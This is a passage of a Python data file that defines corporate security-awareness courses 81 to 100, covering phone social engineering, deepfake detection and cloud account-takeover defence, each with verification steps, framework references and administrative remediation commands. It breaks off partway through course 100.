# scripts/track_data_3.py
# Tracks 9 to 12: Courses 81 to 120

def load_track_3(add):
    # --- TRACK 9: VOICE, IDENTITY & GENERATIVE MEDIA FORENSICS (81 - 90) ---
    add("COURSE-81-VISHING-FUNDAMENTALS", "📞 Vishing Fundamentals: Phone-Based Social Engineering", "Telecom Vishing Threat Surface & Protocol-Driven Interruption SOP", "P2 - HIGH RISK / IDENTITY TARGET",
        "Identify inbound voice phishing tactics including PBX pretexting, conversational rapport traps, and urgent authorization overrides.",
        "PAUSE & SKEPTICISM CHECK: Evaluate unexpected inbound calls demanding immediate action or confidential employee data.",
        "ENFORCE DIRECTORY ONLY CALLBACK: Hang up and call back using the verified number in the company directory—never accept caller numbers.",
        "NO VERBAL AUTHENTICATION: Never read 6-digit MFA codes, BitLocker keys, or passwords over any telephone line.",
        "STIR/SHAKEN CALLER ID ATTESTATION: Telecom PBX monitors cryptographic STIR/SHAKEN Level A/B/C headers to alert on unverified caller IDs.",
        [
            {"id": "c1", "label": "Hang Up and Call Back", "detail": "Always terminate unverified calls and call back via official directory numbers."},
            {"id": "c2", "label": "Zero Spoken Passwords", "detail": "Never disclose passwords or MFA tokens verbally over the telephone."},
            {"id": "c3", "label": "Log Vishing Incident", "detail": "Report suspicious phone inquiries to the telecom security team."}
        ],
        ["FCC STIR/SHAKEN Framework", "NIST SP 800-53 AT-2", "CISA Telephony Security Advisory"],
        ["T1598.003 (Spearphishing Voice)", "T1566 (Phishing)"],
        "Report caller phone number, timestamp, and transcript to voice-security@company.internal."
    )

    add("COURSE-82-FAKED-IT-HELPDESK-CALLS", "🛠️ Fake IT Helpdesk Inbound Calling Drills", "Inbound IT Helpdesk Impersonation Drill & Ticket Validation SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Neutralize imposter IT support calls claiming your laptop has active malware or requires an urgent VPN client certificate update.",
        "REJECT UNVERIFIED REMOTE ACCESS: Never install remote control software (AnyDesk, TeamViewer, RustDesk, Zoho Assist) prompted by an unexpected phone caller.",
        "CROSS-CHECK IT SERVICE TICKET: Demand an official IT Helpdesk ticket number and verify it inside your bookmarked enterprise ServiceNow / Jira Service Desk portal.",
        "VERIFY CALLER IDENTITY WITH HELPDESK: Hang up and call the official IT Helpdesk hotline at extension #4357 (HELP) to confirm technician assignment.",
        "APPLICATION CONTROL (WDAC): Windows Defender Application Control blocks execution of unauthorized remote management tools on managed laptops.",
        [
            {"id": "c1", "label": "Zero Unapproved Remote Access", "detail": "Refuse all requests to install screen-sharing software from inbound callers."},
            {"id": "c2", "label": "ServiceNow Ticket Cross-Check", "detail": "Verify active change ticket in official corporate ticketing system."},
            {"id": "c3", "label": "Call IT Hotline Directly", "detail": "Contact the known IT Helpdesk extension to verify technician dispatch."}
        ],
        ["NIST SP 800-53 AC-17 (Remote Access)", "CISA Alert AA22-321A", "ISO 27001:2022 A.8.20"],
        ["T1598.003 (Spearphishing Voice)", "T1219 (Remote Access Software)"],
        "If remote software was installed, immediately sever network connection and call SOC incident hotline."
    )

    add("COURSE-83-FAKED-BANKING-CALLS", "🏦 Commercial Bank & Wire Recovery Desk Imposter Calls", "Commercial Bank & Wire Recovery Desk Imposter Defense SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Defend against reverse fraud scams where imposter bank security agents call claiming to stop a fraudulent transaction while actually tricking you into authorizing it.",
        "RECOGNIZE REVERSE FRAUD TRAPS: If a caller claims: 'I am from Bank Fraud Desk. Read me the code on your phone to cancel this $10,000 wire', understand the code AUTHORIZES the wire.",
        "IMMEDIATE DISCONNECT & DIRECT CALLBACK: Hang up immediately and call your dedicated commercial relationship manager via the phone number in your banking agreement.",
        "NEVER GENERATE DIGIPASS TOKENS OVER PHONE: Physical or mobile RSA/Digipass dynamic tokens must only be entered into secure online banking portals—never spoken aloud.",
        "DUAL-CUSTODY WIRE CONTROLS: Treasury management systems mandate two independent approvers on separate devices to release outbound wires.",
        [
            {"id": "c1", "label": "Never Read Bank Codes Over Phone", "detail": "Speaking OTP codes to a caller allows them to execute the transaction."},
            {"id": "c2", "label": "Hang Up and Call Bank Direct", "detail": "Use verified commercial banking relationship numbers on contract file."},
            {"id": "c3", "label": "Enforce Dual Authorization", "detail": "Require secondary executive sign-off for all financial releases."}
        ],
        ["FBI IC3 PSA on Bank Impersonation", "PCI-DSS v4.0 Req 8.3", "NIST SP 800-63B"],
        ["T1598.003 (Spearphishing Voice)", "T1589.001 (Credentials)"],
        "Contact Corporate Treasury Security Desk at treasury-sec@company.internal and alert relationship manager."
    )

    add("COURSE-84-EXECUTIVE-VOICE-IMPERSONATION", "👔 Executive Voice Impersonation & BEC Phone Escalations", "Executive Voice Coercion & Directory Callback Enforcement SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Empower employees to remain calm and enforce standard dual-authorization protocols when faced with demanding or aggressive executive voice calls.",
        "MAINTAIN PROCEDURAL RIGOR: Corporate security policy strictly overrides verbal executive demands—no rank permits bypassing financial controls.",
        "CALM DE-ESCALATION PROTOCOL: Use standardized scripts: 'I understand this is urgent. Company policy requires dual-officer sign-off on portal. I will submit the request now.'",
        "MANDATORY DIRECT DIRECTORY CALLBACK: Hang up and call the executive back on their verified mobile number in the corporate directory.",
        "WHISTLEBLOWER POLICY SAFE-HARBOR: Corporate compliance grants complete legal and employment protection to staff who enforce security procedures against pressured requests.",
        [
            {"id": "c1", "label": "Policy Overrides Rank", "detail": "Executive authority does not permit verbal bypass of wire/credential policies."},
            {"id": "c2", "label": "Use De-Escalation Script", "detail": "Politely enforce standardized dual-signoff portal workflows."},
            {"id": "c3", "label": "Direct Mobile Callback", "detail": "Call the executive's known number on file before taking action."}
        ],
        ["NIST SP 800-53 AT-2", "ISO/IEC 27001:2022 A.6.3", "SOX Section 404"],
        ["T1598.003 (Spearphishing Voice)", "T1598 (Social Engineering)"],
        "Log high-pressure executive coercion events with compliance-incident-desk@company.internal."
    )

    add("COURSE-85-CALLER-ID-STIR-SHAKEN", "📡 Caller ID Spoofing & STIR/SHAKEN Limitations", "Telecom STIR/SHAKEN Cryptographic Attestation Verification SOP", "P3 - MEDIUM / RECONNAISSANCE",
        "Analyze telecom caller ID spoofing mechanics and understand the limits of STIR/SHAKEN Level A, B, and C cryptographic attestations.",
        "INSPECT ATTESTATION LEVEL: Check whether inbound telecom caller ID displays verified carrier attestation badge ('Full Attestation Level A').",
        "RECOGNIZE LEVEL C GATEWAY HOPS: Level C (Gateway Attestation) means the originating carrier cannot verify the caller identity; treat with high suspicion.",
        "NEVER TRUST VISUAL CALLER ID STRINGS: Attackers easily spoof caller names and phone numbers via SIP trunk provider interfaces.",
        "TELEPHONY FIREWALL REPUTATION: Corporate Session Border Controllers (SBC) automatically reject inbound VoIP calls from unauthenticated SIP gateways.",
        [
            {"id": "c1", "label": "Caller ID is Easily Spoofed", "detail": "Do not treat a caller ID displaying the company name as authentic proof."},
            {"id": "c2", "label": "Check Attestation Level", "detail": "Look for STIR/SHAKEN verification indicators on enterprise softphones."},
            {"id": "c3", "label": "Directory Callback Mandate", "detail": "Always initiate an outbound callback to verified numbers."}
        ],
        ["FCC TRACED Act Mandate", "ATIS-1000074 (STIR/SHAKEN Standards)", "NIST SP 800-53 AC-3"],
        ["T1589 (Gather Victim Identity Info)", "T1598.003 (Voice)"],
        "Report caller ID spoofing incidents to telecom-compliance@company.internal."
    )

    add("COURSE-86-AI-VOICE-CLONING-AWARENESS", "🎙️ Generative AI Voice Cloning & Audio Vocoders", "Neural Voice Synthesis Detection & Duress Code Verification SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Spot generative neural voice synthesis artifacts, acoustic pitch clipping, unnatural cadence pauses, and lack of ambient acoustic reflections.",
        "LISTEN FOR SYNTHESIS ARTIFACTS: Pay attention to metallic vocal timbre, pitch micro-tremors, missing breathing sounds, and abrupt background noise transitions.",
        "ASK UNPREDICTABLE CONTEXTUAL QUESTIONS: Ask the caller about a private, unindexed personal conversation or shared physical event.",
        "EXECUTE VERBAL DURESS WORD CHALLENGE: Require the caller to speak the secret corporate authorization token registered in the offline vault.",
        "TELEPHONY SPECTRAL ANOMALY FILTER: Corporate VoIP platform runs real-time acoustic neural network classifiers to flag synthetic speech.",
        [
            {"id": "c1", "label": "Listen for Robotic Cadence", "detail": "Spot unnatural pitch shifts, missing breath sounds, or abrupt acoustic cuts."},
            {"id": "c2", "label": "Ask Non-Public Questions", "detail": "Test caller with unindexed private internal context."},
            {"id": "c3", "label": "Require Pre-Shared Passphrase", "detail": "Demand pre-registered offline duress codewords before financial release."}
        ],
        ["NIST AI Risk Management Framework", "CISA Generative AI Risk Advisory", "ISO 27001:2022 A.8.5"],
        ["T1598.003 (Spearphishing Voice)", "T1566 (Phishing)"],
        "If AI voice clone fraud is detected, immediately alert SOC and freeze financial transactions."
    )

    add("COURSE-87-REALTIME-DEEPFAKE-VIDEO", "📹 Real-Time Deepfake Video Conferencing Awareness", "Video Conferencing Deepfake Detection & Liveness Challenge SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Identify real-time generative video deepfakes during Zoom, Teams, and Google Meet executive conference calls.",
        "EXECUTE LATERAL HEAD TURN CHALLENGE: Ask the video participant to turn their head 90 degrees or wave their hand in front of their face to induce mesh tearing.",
        "INSPECT EDGE BLUR & FACIAL MESH ARTIFACTS: Look for blurring around the jawline, unnatural lighting angles, or glasses distortion when moving.",
        "REQUEST SECONDARY OUT-OF-BAND CONFIRMATION: If an executive joins a video call requesting emergency funds, call their cell phone simultaneously.",
        "ENTERPRISE VIDEO WATERMARKING: Video conferencing platforms enforce tenant-authenticated watermarking and biometric liveness detection.",
        [
            {"id": "c1", "label": "Request Lateral Head Turn", "detail": "Ask caller to turn sideways to break real-time 2D generative face mapping."},
            {"id": "c2", "label": "Check Lighting & Jawline Edges", "detail": "Spot flickering facial boundaries and lighting inconsistencies."},
            {"id": "c3", "label": "Simultaneous Mobile Callback", "detail": "Call executive's personal phone on an independent channel."}
        ],
        ["FBI Alert on Deepfake Video in Remote Meetings", "NIST SP 800-63B", "CISA Video Deepfake Guidance"],
        ["T1598 (Social Engineering)", "T1566 (Phishing)"],
        "Report deepfake video meeting incident to executive-security-operations@company.internal."
    )

    add("COURSE-88-VIDEO-LIPSYNC-ARTIFACTS", "🎭 Video Impersonation & Generative Media Forensics", "Generative Video Edge Blur & Desynchronization Inspection SOP", "P2 - HIGH RISK / IDENTITY TARGET",
        "Detect acoustic-visual desynchronization, audio-video lag discrepancies, and digital teeth/tongue rendering anomalies in deepfake video recordings.",
        "EXAMINE LIP-SYNC LATENCY: Watch for speech phonemes that do not accurately align with mouth shape and facial muscle movements.",
        "LOOK FOR ANATOMICAL GLITCHES: Check for unnatural eye blinks, irregular pupil shapes, and blurring around the teeth and tongue.",
        "REVERSE IMAGE SEARCH VIDEO FRAMES: Extract keyframes from suspicious video announcements and submit to Google Lens / TinEye reverse search.",
        "CRYPTOGRAPHIC CONTENT CREDENTIALS (C2PA): Corporate video broadcasts embed C2PA cryptographic provenance metadata verifying camera origin.",
        [
            {"id": "c1", "label": "Scrutinize Lip Synchronization", "detail": "Identify audio arriving milliseconds before or after visible mouth movement."},
            {"id": "c2", "label": "Inspect Eye Blinking & Teeth", "detail": "Look for unnatural blinking rhythms and distorted mouth interior rendering."},
            {"id": "c3", "label": "Check C2PA Content Provenance", "detail": "Verify cryptographic digital watermarks on corporate video releases."}
        ],
        ["C2PA Technical Specification 1.3", "NIST AI RMF", "ISO/IEC 27001:2022 A.8.12"],
        ["T1598 (Social Engineering)", "T1204 (User Execution)"],
        "Submit suspicious video recording to digital-forensics@company.internal for spectral and frame analysis."
    )

    add("COURSE-89-OUT-OF-BAND-IDENTITY-VERIFY", "🔐 Out-of-Band Challenge & Dynamic Verification Codes", "Standard Operating Procedure: Dynamic Challenge-Response & Out-of-Band Verification", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Establish cryptographic challenge-response protocols and asymmetric verification channels to definitively prove caller and sender identity during high-risk requests.",
        "CHALLENGE INBOUND REQUESTS: Issue an ephemeral dynamic verification challenge token generated inside your authentic corporate identity app.",
        "ESTABLISH INDEPENDENT CHANNEL: Never verify an identity using contact information provided within the suspicious message; lookup contact on pre-registered directory.",
        "ENFORCE DUAL-OFFICER VERBAL CONFIRMATION: High-value actions ($10k+ wires, account access grants) require two authorized officers to validate challenge tokens independently.",
        "FIDO2 WEBAUTHN & ZERO-TRUST IDENTITY: Transition authorization workflows to cryptographically signed web requests, eliminating spoken OTPs completely.",
        [
            {"id": "c1", "label": "Issue Dynamic Challenge Token", "detail": "Generate a dynamic ephemeral code inside the corporate identity portal for the requester to verify."},
            {"id": "c2", "label": "Lookup Pre-Registered Contact", "detail": "Initiate out-of-band contact strictly through the official internal Global Address List."},
            {"id": "c3", "label": "Dual-Officer Signoff", "detail": "Require secondary independent officer verification for all high-risk authorization events."},
            {"id": "c4", "label": "Log Out-of-Band Audit Record", "detail": "Attach verified callback timestamps and challenge tokens to the transaction ticket."}
        ],
        ["NIST SP 800-63B Section 5.1.3 (AAL3 Authenticator Assurance)", "MITRE D3FEND D3-MA (Multi-Factor Authentication)", "ISO/IEC 27001:2022 A.8.5 (Access Control)"],
        ["T1598.003 (Spearphishing Voice)", "T1566.002 (Spearphishing Link)"],
        "Log verified challenge ID into ServiceNow ticket and dispatch alert to identity-assurance@company.internal."
    )

    add("COURSE-90-VOICE-VISHING-CRUCIBLE", "⚡ Controlled Voice Vishing Attack Simulation Crucible", "Comprehensive Voice Attack Triage & Rapid Disconnection SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Test and enforce rapid disconnection, de-escalation, and incident escalation skills in live voice vishing attack scenarios.",
        "RAPID DISCONNECTION TRIGGER: If a caller refuses directory callback or attempts aggressive verbal intimidation, politely terminate the call immediately.",
        "LOG CALL METADATA IMMEDIATELY: Record exact caller phone number, time of call, purported department, and specific information requested.",
        "DISPATCH VOICE INCIDENT ALERT: Open a priority ticket with the Voice Security team to block the incoming caller ID number across the corporate PBX.",
        "TELEPHONY SIP FIREWALL BLACKLIST: Telecom infrastructure automatically pushes malicious calling numbers to SIP trunk SBC blacklists across all global office locations.",
        [
            {"id": "c1", "label": "Execute Immediate Disconnect", "detail": "Do not argue or stay on the line with persistent social engineering callers."},
            {"id": "c2", "label": "Record Caller Details", "detail": "Document incoming phone number, exact timestamp, and pretext used."},
            {"id": "c3", "label": "Submit PBX Blacklist Request", "detail": "Notify telecom team to block caller number across all company offices."}
        ],
        ["NIST SP 800-61 Rev 2", "CISA Cross-Sector CPGs", "ISO/IEC 27001:2022 A.5.25"],
        ["T1598.003 (Spearphishing Voice)", "T1566 (Phishing)"],
        "Submit call logs to voice-incident-response@company.internal to initiate automated SBC carrier block."
    )

    # --- TRACK 10: CLOUD, SAAS & MODERN ACCOUNT SECURITY (91 - 100) ---
    add("COURSE-91-CLOUD-SECURITY-FUNDAMENTALS", "☁️ Cloud Security Fundamentals & SaaS Identity Perimeters", "SaaS Identity Perimeter Defense & Conditional Access SOP", "P2 - HIGH RISK / IDENTITY TARGET",
        "Harden SaaS identity perimeters across Microsoft 365, Google Workspace, AWS, and Salesforce by enforcing strict Conditional Access policies.",
        "ENFORCE DEVICE COMPLIANCE REQUIREMENT: Restrict SaaS access strictly to managed devices enrolled in Microsoft Intune or Jamf Pro.",
        "BLOCK LEGACY AUTHENTICATION PROTOCOLS: Disable legacy protocols (IMAP, POP3, SMTP AUTH) that do not support modern multi-factor authentication.",
        "REVIEW ACTIVE REFRESH TOKENS: Regularly inspect active OAuth sessions and app authorizations in your cloud account settings.",
        "CONTINUOUS ACCESS EVALUATION (CAE): Cloud identity systems continuously monitor device health, revoking tokens when compliance state degrades.",
        [
            {"id": "c1", "label": "Require Intune Managed Devices", "detail": "Block SaaS access from unmanaged personal computers."},
            {"id": "c2", "label": "Disable Legacy Auth Protocols", "detail": "Enforce modern authentication across all email and cloud accounts."},
            {"id": "c3", "label": "Audit Active Cloud Sessions", "detail": "Review logged-in devices at myaccount.microsoft.com."}
        ],
        ["NIST SP 800-145 (Cloud Computing)", "CIS Microsoft 365 Benchmark", "ISO 27001:2022 A.8.5"],
        ["T1078.004 (Cloud Accounts)", "T1539 (Steal Web Session Cookie)"],
        "Run PowerShell: `Get-MsolUser -UserPrincipalName user@company.com | Select StrongAuthenticationRequirement`."
    )

    add("COURSE-92-FAKED-CLOUD-NOTIFICATIONS", "📁 Fake Cloud File Sharing Notifications (OneDrive/Drive)", "Spoofed Cloud File Sharing Alerts & Activity Hub Triage SOP", "P2 - HIGH RISK / IDENTITY TARGET",
        "Identify spoofed OneDrive, SharePoint, and Google Drive sharing emails that route users to lookalike login portals.",
        "INSPECT NOTIFICATION ORIGIN: Verify that the email sender address is `no-reply@sharepointonline.com` or `drive-shares-noreply@google.com`.",
        "OPEN CLOUD ACTIVITY CENTER: Navigate directly to OneDrive or Google Drive web apps and check the 'Shared with You' tab to verify legitimate documents.",
        "REPORT FAKE SHARING ALERTS: Submit fraudulent sharing alerts to the SOC to initiate automated tenant mailbox purges.",
        "CLOUD ADVANCED THREAT PROTECTION: Microsoft Defender for Cloud Apps inspects shared document URLs and quarantines malicious payload hosts.",
        [
            {"id": "c1", "label": "Inspect Sender Domain", "detail": "Confirm email originates from genuine cloud tenant infrastructure."},
            {"id": "c2", "label": "Check Shared With You Hub", "detail": "Verify file presence inside official OneDrive/Google Drive web portals."},
            {"id": "c3", "label": "1-Click Phish Alert", "detail": "Submit spoofed file notification to SOC for tenant-wide remediation."}
        ],
        ["Microsoft Cloud Security Benchmark", "NIST SP 800-53 AC-3", "ISO 27001:2022 A.8.12"],
        ["T1566.002 (Spearphishing Link)", "T1539 (Steal Web Session Cookie)"],
        "Query Graph API: `Get-MgUserMailFolderMessage` to search and purge spoofed cloud notification emails."
    )

    add("COURSE-93-SHARED-DOCUMENT-PHISHING", "📄 Shared Document Phishing via Google Docs & Word Online", "Shared Document Phishing (Google Docs/Word Online) Quarantine SOP", "P2 - HIGH RISK / IDENTITY TARGET",
        "Neutralize phishing attacks where legitimate Google Docs or Word Online files host deceptive hyperlinks to bypass inbound email security filters.",
        "INSPECT EMBEDDED BUTTONS IN CLOUD DOCS: Treat Google Docs containing a single oversized button ('Click to View Encrypted Document') as phishing lures.",
        "REPORT ABUSE TO CLOUD PROVIDER: Click 'Help -> Report Abuse' inside Google Docs / Word Online to trigger global provider takedown.",
        "NEVER ENTER CREDENTIALS IN REDIRECT PORTALS: If a Google Doc redirects you to an external login screen, close the tab immediately.",
        "CASB REAL-TIME LINK INSPECTION: Cloud Access Security Broker (CASB) proxies scan document text and rewrite embedded hyperlinks in real time.",
        [
            {"id": "c1", "label": "Spot Placeholder One-Pagers", "detail": "Google Docs with a single 'Click to Access' button are phishing traps."},
            {"id": "c2", "label": "Use In-App Report Abuse", "detail": "Flag malicious documents to Google/Microsoft trust and safety teams."},
            {"id": "c3", "label": "Isolate Browser Tab", "detail": "Close browser tab if cloud document redirects to external login portal."}
        ],
        ["CISA Cyber Hygiene Alerts", "NIST SP 800-53 SC-7", "ISO 27001:2022 A.8.12"],
        ["T1566.002 (Spearphishing Link)", "T1204.001 (User Execution)"],
        "Report Google Doc abuse URL to Google Safe Browsing and notify internal security operations."
    )

    add("COURSE-94-OAUTH-AUTHORIZATION-FLOWS", "🔑 OAuth 2.0 & OpenID Connect Authorization Flow Mechanics", "OAuth 2.0 PKCE & Authorization Code Flow Inspection SOP", "P2 - HIGH RISK / IDENTITY TARGET",
        "Understand OAuth 2.0 authorization code flows with PKCE and inspect requested API scope parameters before granting application consent.",
        "INSPECT REDIRECT URI & CLIENT ID: Scrutinize the browser URL parameters during OAuth consent (`client_id=`, `redirect_uri=`, `scope=`).",
        "EVALUATE REQUESTED SCOPES: Flag third-party apps requesting invasive scopes such as `Mail.ReadWrite`, `Files.ReadWrite.All`, or `offline_access`.",
        "VERIFY PUBLISHER VERIFICATION BADGE: Look for the blue verified publisher badge in Microsoft Entra ID / Google Cloud consent screens.",
        "ADMIN CONSENT WORKFLOW ENFORCEMENT: Corporate tenant settings require IT Administrator review and approval before any third-party app can access corporate data.",
        [
            {"id": "c1", "label": "Inspect OAuth URL Parameters", "detail": "Check client_id and redirect_uri in the browser address bar."},
            {"id": "c2", "label": "Scrutinize API Permissions", "detail": "Reject apps demanding full read/write access to emails and files."},
            {"id": "c3", "label": "Require Verified Publisher", "detail": "Do not grant permissions to unverified third-party app publishers."}
        ],
        ["RFC 6749 (OAuth 2.0 Framework)", "RFC 7636 (PKCE)", "NIST SP 800-63B"],
        ["T1528 (Application Access Token)", "T1566.002 (Spearphishing Link)"],
        "Inspect application consent request in Entra ID Portal: `portal.azure.com/#blade/Microsoft_AAD_IAM/StartboardApplicationsMenuBlade`."
    )

    add("COURSE-95-MALICIOUS-OAUTH-CONSENT", "⚠️ Malicious OAuth App Consent Grants (Illicit Permissions)", "Illicit OAuth Consent App Revocation & Scope Auditing SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Neutralize Illicit Consent Grant attacks where malicious third-party SaaS apps establish persistent API access to corporate mailboxes without needing user passwords.",
        "HALT CONSENT PROMPTS FROM EMAIL LINKS: Never approve app permissions prompted by unsolicited emails claiming 'Security Update required'.",
        "AUDIT GRANTED ENTERPRISE APPLICATIONS: Open `myapps.microsoft.com` -> 'Manage Your Applications' and revoke any unknown third-party apps.",
        "SOC APPLICATION REVOCATION: Notify SOC to execute tenant-wide service principal deletion via Microsoft Graph PowerShell.",
        "DISABLE USER CONSENT FOR UNVERIFIED APPS: Microsoft Entra ID tenant policy restricts end-user consent strictly to certified, verified publisher applications.",
        [
            {"id": "c1", "label": "Never Accept Unsolicited Consent Prompts", "detail": "Do not click Accept on OAuth permission screens from unexpected links."},
            {"id": "c2", "label": "Review Granted Apps Monthly", "detail": "Audit authorized third-party applications at myapps.microsoft.com."},
            {"id": "c3", "label": "Emergency App Token Deletion", "detail": "Revoke OAuth refresh tokens and delete malicious service principals."}
        ],
        ["Microsoft Guideline on Illicit Consent Grants", "CISA CPG 2.B", "ISO 27001:2022 A.8.12"],
        ["T1528 (Application Access Token)", "T1098.003 (Additional Cloud Roles)"],
        "Execute PowerShell: `Remove-AzureADServicePrincipal -ObjectId <App-GUID>` to instantly kill malicious OAuth app access."
    )

    add("COURSE-96-FAKED-SAAS-SSO-PORTALS", "🏢 Fake SaaS Single Sign-On Gateways (Workday & Salesforce)", "Spoofed SaaS SSO Gateway Detection & Address Bar Validation SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Detect spoofed Single Sign-On (SSO) login gateways targeting Workday, Salesforce, ServiceNow, and internal company Intranet portals.",
        "CONFIRM IDP REDIRECTION FLOW: Legitimate SSO flows must seamlessly redirect through your verified identity provider (`login.microsoftonline.com` or `company.okta.com`).",
        "INSPECT CERTIFICATE SUBJECT ALTERNATIVE NAME (SAN): Check browser TLS certificate details to confirm issuer and registered domain identity.",
        "NEVER ENTER PASSWORDS ON NON-SSO DOMAINS: If a Workday login page asks for your Active Directory password on `workday-auth-security.net`, close immediately.",
        "FIDO2 WEBAUTHN ZERO-PHISHING GUARANTEE: Hardware passkeys enforce cryptographic origin matching, preventing authentication on spoofed SaaS portals.",
        [
            {"id": "c1", "label": "Verify IdP Address Bar", "detail": "Confirm login occurs exclusively on your company's official Okta/Entra ID domain."},
            {"id": "c2", "label": "Inspect TLS Certificate Details", "detail": "Verify certificate is issued to the genuine corporate identity service."},
            {"id": "c3", "label": "Use Hardware FIDO2 Tokens", "detail": "Hardware tokens refuse to supply credentials to spoofed SSO portals."}
        ],
        ["NIST SP 800-63B Section 5.1", "CISA Phishing-Resistant MFA Guide", "ISO 27001:2022 A.8.5"],
        ["T1566.002 (Spearphishing Link)", "T1078 (Valid Accounts)"],
        "Report spoofed SSO portal URL to SOC for immediate firewall domain block and registrar abuse complaint."
    )

    add("COURSE-97-SESSION-TOKEN-THEFT-ESTS", "🍪 Session Token Theft & ESTSAuth Cookie Hijacking", "ESTSAuth Session Cookie Revocation & Token Binding SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Remediate adversary theft of authenticated `ESTSAuth` session cookies that allow bypass of Multi-Factor Authentication without triggering new logins.",
        "IMMEDIATE SESSION INVALIDATION: If credential entry on a malicious link is suspected, execute user token revocation to kill all active cloud sessions.",
        "CHECK ENTRA ID SIGN-IN IP ANOMALIES: Review Entra ID sign-in logs for identical session cookies used across divergent geographic IP addresses.",
        "PASSWORD RESET WITH ACTIVE REVOCATION: Reset the corporate password while simultaneously executing `Revoke-AzureADUserAllRefreshToken`.",
        "TOKEN PROTECTION & CONDITIONAL ACCESS: Enable Entra ID Token Protection requiring session cookies to be cryptographically bound to device TPMs.",
        [
            {"id": "c1", "label": "Instant Cloud Token Revocation", "detail": "Terminate all active OAuth and ESTSAuth sessions in Entra ID admin center."},
            {"id": "c2", "label": "Reset Account Password", "detail": "Change corporate password to invalidate legacy session contexts."},
            {"id": "c3", "label": "Audit Impossible Travel Sign-ins", "detail": "Check sign-in logs for concurrent sessions from foreign IP ranges."}
        ],
        ["NIST SP 800-63B Section 5.2", "CISA Fact Sheet on Token Theft", "MITRE ATT&CK T1539"],
        ["T1539 (Steal Web Session Cookie)", "T1078 (Valid Accounts)"],
        "Run PowerShell: `Revoke-AzureADUserAllRefreshToken -ObjectId <User-UUID>` to invalidate all active web session cookies."
    )

    add("COURSE-98-CLOUD-MAILBOX-FORWARDING", "📬 Cloud Mailbox Forwarding Rule Hijacking Detection", "Cloud Mailbox Forwarding & Hidden Inbox Rule Auditing SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Detect and dismantle hidden Outlook inbox rules and automated email forwarding configured by attackers to secretly exfiltrate wire confirmations and sensitive emails.",
        "AUDIT OUTLOOK INBOX RULES MONTHLY: Open Outlook -> File -> Manage Rules & Alerts to inspect all active forwarding and auto-delete rules.",
        "FLAG SUSPICIOUS RULE PATTERNS: Look for rules with names like `.` or `RSS` that move emails containing 'invoice', 'wire', or 'payment' to Deleted Items.",
        "DELETE UNAUTHORIZED RULES IMMEDIATELY: Delete unknown inbox rules and alert the SOC to investigate unauthorized mailbox access.",
        "TENANT-WIDE AUTO-FORWARDING BLOCK: Exchange Online Anti-Spam outbound policy blocks automated email forwarding to external domains by default.",
        [
            {"id": "c1", "label": "Inspect Outlook Inbox Rules", "detail": "Regularly audit rules moving messages to Archive, RSS, or Deleted Items."},
            {"id": "c2", "label": "Check Forwarding Settings", "detail": "Verify email is not being automatically forwarded to personal or external webmail."},
            {"id": "c3", "label": "Report Hidden Forwarders", "detail": "Notify SOC immediately if unauthorized auto-forwarding rules are found."}
        ],
        ["CISA Alert AA20-302A (BEC Mailbox Rules)", "NIST SP 800-53 AC-3", "ISO 27001:2022 A.8.7"],
        ["T1114.003 (Email Forwarding Rule)", "T1078 (Valid Accounts)"],
        "Execute PowerShell script: `Get-InboxRule -Mailbox user@company.com | Select-Object Name, Description, ForwardTo, MoveToFolder`."
    )

    add("COURSE-99-ENTRA-ID-AUDIT-FORENSICS", "🔍 Cloud Investigation & Entra ID Audit Log Forensics", "Entra ID Unified Audit Log & Risk Sign-In Investigation SOP", "P2 - HIGH RISK / IDENTITY TARGET",
        "Conduct forensic investigations inside Microsoft Entra ID audit logs, tracking anomalous IP sign-ins, device compliance changes, and role assignments.",
        "AUDIT USER SIGN-IN LOGS: Filter Entra ID sign-in logs for 'Failure', 'Conditional Access Failure', and 'MFA Denied' events.",
        "TRACK ELEVATED PRIVILEGE GRANTS: Audit directory role changes (`Add member to role`) to ensure no unauthorized Global Admin accounts were created.",
        "ANALYZE RISK DETECTIONS: Triage 'Atypical Travel', 'Unfamiliar Sign-in Properties', and 'Anonymous IP Address' risk alerts.",
        "CENTRALIZED SIEM LOG STREAMING: Entra ID diagnostic settings stream all sign-in and audit logs to Microsoft Sentinel / Splunk for long-term retention.",
        [
            {"id": "c1", "label": "Audit Sign-In Logs", "detail": "Review authentication events, client apps used, and geographic IP origins."},
            {"id": "c2", "label": "Review Privileged Role Changes", "detail": "Ensure administrative promotions follow formal Change Management tickets."},
            {"id": "c3", "label": "Triage Identity Risk Detections", "detail": "Investigate impossible-travel and anonymous-proxy sign-in alerts."}
        ],
        ["Microsoft Cloud Security Benchmark", "NIST SP 800-92 (Log Management)", "ISO 27001:2022 A.8.15"],
        ["T1078.004 (Cloud Accounts)", "T1098 (Account Manipulation)"],
        "Execute KQL query in Sentinel: `SigninLogs | where ResultType != 0 | summarize count() by UserPrincipalName, IPAddress`."
    )

    add("COURSE-100-CLOUD-TAKEOVER-CRUCIBLE", "⚡ Cloud Account Takeover Threat Simulation Crucible", "Cloud Tenant Compromise Triage & Global Admin Revocation SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Execute comprehensive incident triage during cloud account takeover scenarios, containing adversary lateral movement across Microsoft 365 and AWS.",
        "STEP 1 - EMERGENCY ACCOUNT LOCKOUT: Block user sign-in inside Entra ID admin center (`AccountEnabled = $false`).",
        "STEP 2 - ACTIVE TOKEN REVOCATION: Force session token invalidation across all Microsoft 365 and connected SaaS applications.",
        "STEP 3 - PURGE MALICIOUS MAILBOX RULES & OAUTH APPS: Remove attacker-created inbox forwarding rules, delegator permissions, and rogue OAuth apps.",
        "STEP 4 - PRIVILEGED IDENTITY RESET: Reset MFA authentication methods in person or via verified video challenge before re-enabling the account.",
        [
            {"id": "c1", "label": "Disable Compromised Account", "detail": "Set user account status to disabled immediately to halt active adversary sessions."},
            {"id": "c2", "label": "Revoke All OAuth Tokens", "detail": "Invalidate all refresh tokens across cloud tenant infrastructure."},
